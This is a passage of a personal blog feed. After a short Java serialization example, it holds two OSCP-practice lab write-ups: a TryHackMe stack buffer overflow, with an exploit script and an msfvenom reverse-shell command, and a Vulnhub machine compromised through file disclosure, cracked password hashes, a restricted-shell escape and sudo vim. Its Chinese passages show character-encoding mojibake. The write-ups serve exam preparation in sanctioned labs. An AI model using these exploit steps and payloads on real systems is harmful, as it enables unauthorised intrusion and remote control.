class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">implements</span> <span class="title">Cloneable</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> c_value = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">public</span> Integer[] c_array = &#123;<span class="number">20</span>&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">Cloneable</span>, <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b_value = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> C b_c_class = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> B <span class="title">serialize_clone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        B bClone = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//åºåˆ—åŒ–æœ¬ç±»</span></span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line"></span><br><span class="line">            oos.writeObject(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">            ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">            bClone = (B) ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bClone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        B bb = b.serialize_clone();</span><br><span class="line">        bb.b_value = <span class="number">200</span>;</span><br><span class="line">        bb.b_c_class.c_value = <span class="number">300</span>;</span><br><span class="line">        bb.b_c_class.c_array[<span class="number">0</span>] = <span class="number">30</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><strong>Debugæ˜¾ç¤º:</strong></p><p>b = {B@945}<br>&nbsp;&nbsp;&nbsp; b_value = 1<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@950} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = 100<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_array = <span style="color:red">{Integer[1]@951} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   0 = {Integer@952} 20<br>bb = {B@946}<br>&nbsp;&nbsp;&nbsp; b_value = 200<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:red">{C@947} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_value = 300<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  c_array = <span style="color:red">{Integer[1]@948} </span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   0 = {Integer@949} 30</p><br><p><strong>Reference:</strong></p><p><a href="https://www.cnblogs.com/fnlingnzb-learner/p/10649509.html">https://www.cnblogs.com/fnlingnzb-learner/p/10649509.html</a></p>]]></content>
    
    
    <summary type="html">&lt;br&gt;

&lt;p&gt;java ä¸­ &lt;em&gt;Object&lt;/em&gt; çš„æ“ä½œéƒ½æ˜¯å¼•ç”¨ã€‚&lt;em&gt;åŸå§‹æ•°æ®ç±»å‹&lt;/em&gt;æ“ä½œéƒ½æ˜¯å€¼æ‹·è´ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œçš„æ“ä½œå°±åŒ…æ‹¬ &lt;strong&gt;èµ‹å€¼&lt;/strong&gt; å’Œ å‡½æ•°&lt;strong&gt;å‚æ•°ä¼ é€’&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>OSCP report ç»ƒæ‰‹ä¹‹ - tryhackme bufferoverflow</title>
    <link href="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/"/>
    <id>http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/</id>
    <published>2021-02-14T09:53:02.000Z</published>
    <updated>2021-02-14T13:24:45.455Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸´è¿‘  OSCP Examäº†ï¼Œåšç‚¹ bufferoverflow çš„é¶æœºç»ƒç»ƒæ‰‹ã€‚ä¹‹å‰æ— æ„é—´åœ¨ twiiter ä¸Šçœ‹åˆ°äº†ä¸€ä¸ªé¶åœºï¼Œæœ‰ bofã€‚é‚æ¥ç»ƒæ‰‹ã€‚é¡ºä¾¿ä¹Ÿç»ƒç»ƒ Report çš„ç¼–å†™ã€‚</p><br><p>é¶æœºåœ°å€ï¼š</p><p><a href="https://tryhackme.com/room/bufferoverflowprep">https://tryhackme.com/room/bufferoverflowprep</a></p><br><p>è¿™ç§æ˜¯æœ€åŸºæœ¬çš„ BOFï¼Œæ²¡æœ‰ä¿æŠ¤ä»€ä¹ˆçš„ï¼Œéƒ½æ˜¯èµ°ä¸ªæµç¨‹å°±å·®ä¸å¤šäº†ã€‚</p><p>ps:</p><p>ä¸­é€”åƒäº†ä¸ªé¥­ï¼Œé‡å¯äº† lab machineã€‚å¯¼è‡´å‰åæœºå™¨ ip ä¸ä¸€è‡´äº†ï¼Œä¸è¦åœ¨æ„ã€‚ã€‚ã€‚</p><span id="more"></span><p><strong>Snooping around the target</strong></p><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/1.png" style="width:500px"><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/2.png" style="width:500px"><br><p><strong>Create a python script as exp. use msf-pattern_create to generate a string.</strong></p><p>a@kali:~/Desktop/bof$ <span style="color:blue">msf-pattern_create -l 1000</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;PAYLOAD&quot;</span></span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;10.10.65.218&#x27;</span>, <span class="number">1337</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.send(<span class="string">&#x27;OVERFLOW2 &#x27;</span>+payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><br><p><strong>Note the value of EIP.</strong></p><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/3.png" style="width:500px"><br><p><strong>Use msf-pattern_offset to get the â€œeipâ€ offset</strong></p><p>a@kali:~/Desktop/bof$ <span style="color:blue">msf-pattern_offset -l 1000 -q 76413176</span></p><p>[*] Exact match at offset <span style="color:red">634</span></p><br><p><strong>ensure â€œeipâ€ offset</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;BBBB&quot;</span></span><br></pre></td></tr></table></figure><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/4.png" style="width:500px"><br><p><strong>check bad chars.Delete â€œ<span style="color:red">\x00,\x0a,\x0d</span> firstâ€</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;BBBB&quot;</span>+<span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0B\x0C\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF&quot;</span></span><br></pre></td></tr></table></figure><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/5.png" style="width:500px"><br><p><strong>copy these chars,edit these like following (You can do it easily with â€œsublime textâ€):</strong></p><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/6.png" style="width:500px"><br><p><strong>create a python script to auto check bad char:</strong></p><p><a href="https://github.com/xiaopan233/OSCP-Script/blob/main/bof/badchars_check.py">https://github.com/xiaopan233/OSCP-Script/blob/main/bof/badchars_check.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rightChars = <span class="string">&quot;\xXX\xXX\xXX......&quot;</span>  <span class="comment">#the chars in python payload</span></span><br><span class="line">memeryChars = <span class="string">&quot;\xXX\xXX\xXX......&quot;</span> <span class="comment">#chars from immunity debugger hex dump</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(memeryChars)):</span><br><span class="line"><span class="keyword">if</span> rightChars[i] != memeryChars[i]:</span><br><span class="line">print(<span class="string">&quot;[-] Find bad char!&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;[-] Current char: &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(rightChars[i])))</span><br><span class="line"><span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">print(<span class="string">&quot;[-] Previous char: &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(rightChars[i-<span class="number">1</span>])))</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">print(<span class="string">&quot;[+] Not Find bad char!&quot;</span>)</span><br></pre></td></tr></table></figure><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/7.png" style="width:600px"><br><p><strong>Find a bad char â€œ<span style="color:red">\x23</span>â€œ</strong></p><p><strong>from payload delete char â€œ<span style="color:red">\x23</span>â€œ.</strong></p><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;BBBB&quot;</span>+<span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0B\x0C\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF&quot;</span></span><br></pre></td></tr></table></figure><br><p><strong>Then resend payload again.Repeat above process.Until  detect no bad char.</strong></p><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/8.png" style="width:500px"><br><p><strong>all detected bad chars following:</strong></p><p><span style="color:red">\x23, \x3c, \x83, \xba</span></p><p><strong>Next step.Find jmp esp address.</strong></p><p><strong>type command â€œ<span style="color:blue">!mona modules</span>â€œ to detect all modules.</strong></p><p><strong>We should note the dll which without protection.For me the best dll is from the vulnnerable application.</strong></p><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/9.png" style="width:800px"><br><p><strong>get the opcode of â€œjmp espâ€</strong></p><p>a@kali:~/Desktop$ <span style="color:blue">msf-nasm_shell </span><br>nasm &gt; <span style="color:blue">jmp esp</span><br>00000000  <span style="color:red">FFE4</span>              jmp esp</p><p><strong>not only â€œjmp espâ€,but there also are â€œjmp ebpâ€,â€call espâ€,â€œjmp eaxâ€ etc.</strong></p><p>nasm &gt; <span style="color:blue">jmp ebp</span><br>00000000  <span style="color:red">FFE5</span>              jmp ebp<br>nasm &gt; <span style="color:blue">call esp</span><br>00000000  <span style="color:red">FFD4</span>              call esp<br>nasm &gt; <span style="color:blue">jmp eax</span><br>00000000  <span style="color:red">FFE0</span>              jmp eax</p><p><strong>Note that: use diffrent opcode, the shellcode location we put is diffrent too.</strong></p><p><strong>Here I use the first dll module â€œessfunc.dllâ€.head over to search the address of â€œjmp espâ€ opcode</strong></p><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/10.png" style="width:500px"><br><p><strong>We head over to test address â€œ<span style="color:red">0x625011af</span>â€œ.</strong></p><p><strong>â€œjmp espâ€ will change eip to the address where esp pointed.</strong></p><p><strong>We can put some â€œ<span style="color:red">\x90</span>â€œ after â€œjmp espâ€ address in our payload to verify if it work.</strong></p><p><strong>change python payload to following:</strong></p><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;\xaf\x11\x50\x62&quot;</span>+<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> <span class="comment">#note that return address should be reverse.0x625011af should be 0xaf115062</span></span><br></pre></td></tr></table></figure><p><strong>Check if  it work in immunity debugger:</strong></p><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/11.png" style="width:800px"><br><p><strong>It worked!</strong></p><p><strong>Use msfvenom to generate shellcode.</strong></p><p><strong>command:</strong></p><p><span style="color:blue">msfvenom -p windows/shell_reverse_tcp LHOST=10.8.132.252 LPORT=443 -f python -b â€œ\x00\x0a\x0d\x23\x3c\x83\xbaâ€</span></p><br><p><strong>modify our exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">......  <span class="comment"># here are the shellcode which generated by msfvenom</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;\xaf\x11\x50\x62&quot;</span>+<span class="string">&quot;\x90&quot;</span>*<span class="number">32</span>+buf  <span class="comment">#make sure there is some nop between shellcode and return address</span></span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;10.10.15.141&#x27;</span>, <span class="number">1337</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.send(<span class="string">&#x27;OVERFLOW2 &#x27;</span>+payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><br><img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/12.png" style="width:800px"><br><p><strong>BOOM!!</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸´è¿‘  OSCP Examäº†ï¼Œåšç‚¹ bufferoverflow çš„é¶æœºç»ƒç»ƒæ‰‹ã€‚ä¹‹å‰æ— æ„é—´åœ¨ twiiter ä¸Šçœ‹åˆ°äº†ä¸€ä¸ªé¶åœºï¼Œæœ‰ bofã€‚é‚æ¥ç»ƒæ‰‹ã€‚é¡ºä¾¿ä¹Ÿç»ƒç»ƒ Report çš„ç¼–å†™ã€‚&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;é¶æœºåœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/bufferoverflowprep&quot;&gt;https://tryhackme.com/room/bufferoverflowprep&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;è¿™ç§æ˜¯æœ€åŸºæœ¬çš„ BOFï¼Œæ²¡æœ‰ä¿æŠ¤ä»€ä¹ˆçš„ï¼Œéƒ½æ˜¯èµ°ä¸ªæµç¨‹å°±å·®ä¸å¤šäº†ã€‚&lt;/p&gt;
&lt;p&gt;ps:&lt;/p&gt;
&lt;p&gt;ä¸­é€”åƒäº†ä¸ªé¥­ï¼Œé‡å¯äº† lab machineã€‚å¯¼è‡´å‰åæœºå™¨ ip ä¸ä¸€è‡´äº†ï¼Œä¸è¦åœ¨æ„ã€‚ã€‚ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="OSCP" scheme="http://example.com/categories/OSCP/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>OSCP report ç»ƒæ‰‹ä¹‹ - vulnhub development-improved</title>
    <link href="http://example.com/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/"/>
    <id>http://example.com/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/</id>
    <published>2021-02-11T14:10:02.000Z</published>
    <updated>2021-02-28T12:06:44.738Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸´è¿‘  OSCP Examäº†ï¼Œåšç‚¹ Vulnhub çš„é¶æœºç»ƒç»ƒæ‰‹ï¼Œé¡ºä¾¿ä¹Ÿç»ƒç»ƒ Report çš„ç¼–å†™ã€‚</p><br><p>é¶æœºåœ°å€ï¼š</p><p><a href="https://www.vulnhub.com/entry/digitalworldlocal-development,280/">https://www.vulnhub.com/entry/digitalworldlocal-development,280/</a></p><br><p> <strong>stuck:</strong></p><p>1ã€å…³é”®æ—¶å€™ã€‚ã€‚å¿˜äº†æŸ¥çœ‹ç½‘é¡µæºä»£ç ã€‚å…³çœ‹æç¤ºçš„å­—å»äº†ï¼Œçœ‹äº†æ”»ç•¥æ‰å‘ç°è—åœ¨ç½‘é¡µæºä»£ç é‡Œã€‚ã€‚ã€‚çŠ¯äº†ä½çº§é”™è¯¯ã€‚ã€‚</p><p>2ã€ç½‘é¡µæŠ¥é”™çš„æ—¶å€™ï¼Œæ²¡æœ‰æƒ³åˆ°å»æœç´¢æ–‡ä»¶åã€‚çœ‹äº†æ”»ç•¥æ‰å‘ç°ç™¾åº¦èƒ½æœåˆ°ç›¸å…³çš„ exploit</p><br><p>OSCP Exam Report çš„æ¨¡æ¿åœ¨æ­¤ï¼š</p><p><a href="https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf">https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf</a></p><br><p>ç”±äº Report ä¸­åªæœ‰ç¬¬ä¸‰èŠ‚æ˜¯é‡ç‚¹ï¼Œæ‰€ä»¥æœ¬èŠ‚å°±ç›´æ¥ä»¿ç…§ç¬¬ä¸‰èŠ‚æ¥å†™äº†ã€‚</p><span id="more"></span><h2 id="3-2-Report-â€“-Service-Enumeration"><a href="#3-2-Report-â€“-Service-Enumeration" class="headerlink" title="3.2 Report â€“ Service Enumeration"></a>3.2 Report â€“ Service Enumeration</h2><table><thead><tr><th>Server IP Address</th><th>Ports Open</th><th>Service / Banner</th></tr></thead><tbody><tr><td>192.168.92.164</td><td>22ï¼Œ 8080</td><td>ssh / Apache</td></tr></tbody></table><br><h2 id="3-3-Report-â€“-Penetration"><a href="#3-3-Report-â€“-Penetration" class="headerlink" title="3.3 Report â€“ Penetration"></a>3.3 Report â€“ Penetration</h2><p><strong>Vulnerability Exploited:</strong>  <strong><span style="color:blue">SiTeFiLoÂ File Disclosure vulnerability</span></strong></p><p><strong>System Vulnerable:</strong> 192.168.92.164</p><p><strong>Vulnerability Explanation:</strong> The Simple Text-File Login script (SiTeFiLo) suffers from a File Disclosure vulnerability . Leak a ssh account username and password.This vulnerability was used to obtain a low privilege shell.</p><p><strong>Privilege Escalation Vulnerability:</strong> Credential leak and abuse sudo permission</p><p><strong>Vulnerability Fix:</strong> Update SiTeFiLo to the lasted version</p><p><strong>Severity:</strong> <strong><span style="color:red">Critical</span></strong></p><br><p><strong>Information Gathering:</strong></p><br><p>kali@kali:~/Desktop$ <strong><span style="color:blue">sudo nmap -sV 192.168.92.164 -p 1-65535 -n</span></strong></p><p>â€¦â€¦</p><p>PORT     STATE SERVICE     VERSION</p><p><strong><span style="color:red">22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span></strong></p><p>113/tcp  open  ident?</p><p>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</p><p>445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</p><p><strong><span style="color:red">8080/tcp open  http-proxy  IIS 6.0</span></strong></p><br><p><strong>Browse port 8080 web page.View the source code.Note these stuff:</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/1.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/html_pages">http://192.168.92.164:8080/html_pages</a>. â€œdevelopmentâ€ may be a hint</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/2.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/development.html">http://192.168.92.164:8080/development.html</a>. View the source code.Find an intersting page</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/3.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/developmentsecretpage/">http://192.168.92.164:8080/developmentsecretpage/</a>. Find a link</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/4.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/developmentsecretpage/patrick.php">http://192.168.92.164:8080/developmentsecretpage/patrick.php</a>. Find a link again</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/5.png" style="width:800px"><br><p><strong>Browse url <a href="http://192.168.92.164:8080/developmentsecretpage/patrick.php?logout=1">http://192.168.92.164:8080/developmentsecretpage/patrick.php?logout=1</a>. Try to submit the form</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/6.png" style="width:800px"><br><p><strong>After submit the form.Get an error</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/7.png" style="width:800px"><br><p><strong>Searching the file name in Google.Get a sensitive data disclosure bug</strong></p><p><strong>Reference:</strong></p><p><a href="https://www.exploit-db.com/exploits/7444">https://www.exploit-db.com/exploits/7444</a></p><br><p><strong>Browse url <a href="http://192.168.92.164:8080/developmentsecretpage/slog_users.txt">http://192.168.92.164:8080/developmentsecretpage/slog_users.txt</a>. Get four accountsâ€™ username and password</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/8.png" style="width:800px"><br><p><strong>Credentials here:</strong></p><p>admin, 3cb1d13bb83ffff2defe8d1443d3a0eb</p><p>intern, 4a8a2b374f463b7aedbb44a066363b81</p><p>patrick, 87e6d56ce79af90dbe07d387d3d0579e</p><p>qiu, ee64497098d0926d198f54f6d5431f98</p><br><p><strong>go to <a href="https://www.somd5.com/">https://www.somd5.com/</a> website to crack above password md5 hash.</strong></p><p><strong>Plaintext username and password here:</strong></p><p>patrick:P@ssw0rd25</p><p>intern:12345678900987654321</p><p>qiu:qiu</p><br><p><strong>Try to use above username and password logging ssh. Only user â€œinternâ€ logging successfully. But our shell is a limited shell named â€œlshellâ€</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/9.png" style="width:500px"><br><p><strong>note that we can use command â€œechoâ€</strong></p><p><strong>escape payload:</strong></p><p><span style="color:blue">echo &amp;&amp; â€˜bashâ€™</span></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/10.png" style="width:500px"><br><p><strong>Enum target information.</strong></p><p><span style="color:blue">cat /etc/passwd</span></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/11.png" style="width:800px"><br><p><strong>Note there a user â€œpatrickâ€. We have this accountâ€™s password by SiTeFiLo â€œsensitive data disclosure bugâ€ before.</strong></p><p><strong>Try to use command â€œsuâ€ to privilege lateral move to user <span style="color:red">â€œpatrickâ€</span> associated password <span style="color:red">â€œP@ssw0rd25â€</span>.</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/12.png" style="width:500px"><br><p><strong>Eunmeration the sudo Permissions for user â€œpatrickâ€</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/13.png" style="width:500px"><br><p><strong>use vim to get root permission.</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/14.png" style="width:500px"><br><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/15.png" style="width:500px"><br><p><strong>Proof:</strong></p><img src="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/16.png" style="width:800px">]]></content>
    
    
